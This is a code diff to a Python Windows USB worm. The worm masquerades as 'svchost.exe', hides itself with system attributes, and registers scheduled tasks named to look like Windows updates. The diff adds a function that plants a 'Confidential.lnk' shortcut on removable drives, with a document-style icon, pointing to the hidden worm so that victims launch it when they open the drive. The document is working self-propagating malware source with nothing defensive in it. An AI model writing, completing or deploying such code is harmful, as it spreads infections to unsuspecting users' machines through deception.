@@ -6,6 +6,11 @@ import time
 import ctypes
 import requests
 import sys
+try:
+    from win32com.client import Dispatch
+    from win32com.shell import shell
+except ImportError:
+    pass  # pywin32 not installed, skip shortcut creation
 
 WORM_NAME = "svchost.exe"
 PAYLOAD_NAME = "init.exe"
@@ -13,6 +18,7 @@ WORM_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Templates', WO
 PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), PAYLOAD_NAME) 
 WORM_TASK_NAME = "WindowsUpdateService"  
 PAYLOAD_TASK_NAME = "SystemUpdateTask"  
+SHORTCUT_NAME = "Confidential.lnk"
 FLAG_FILE = os.path.join(os.getenv('TEMP'), "1572754491.txt")
 
 def is_admin():
@@ -56,12 +62,25 @@ def install_worm():
     shutil.copy(sys.executable, WORM_PATH)
     subprocess.run(['attrib', '+h', '+s', '+r', WORM_PATH], shell=True)
 
+def create_shortcut(drive):
+    """Create a shortcut (Confidential.lnk) on USB pointing to the usb worm"""
+    try:
+        shell = Dispatch('WScript.Shell')
+        shortcut_path = os.path.join(drive, SHORTCUT_NAME)
+        target_path = os.path.join(drive, WORM_NAME)
+        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut.TargetPath = target_path
+        shortcut.IconLocation = "%SystemRoot%\\system32\\shell32.dll,70"  # PDF icon
+        shortcut.Description = "Confidential Document"
+        shortcut.save()
+    except Exception:
+        pass
+
 def infect_usb(drive):
-    """Copy worm to USB, create lure."""
     worm_dest = os.path.join(drive, WORM_NAME)
     shutil.copy(sys.executable, worm_dest)
-    subprocess.run(['attrib', '+h', '+s', '+r', worm_dest], shell=True)
-    # TODO: Add shortcut lure (e.g., Confidential.lnk) with pywin32
+    subprocess.run(['attrib', '+h', '+s', '+r', worm_dest], shell=True)  # Hide worm
+    create_shortcut(drive)  # Create lure shortcut
 
 def monitor_usb():
     known_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
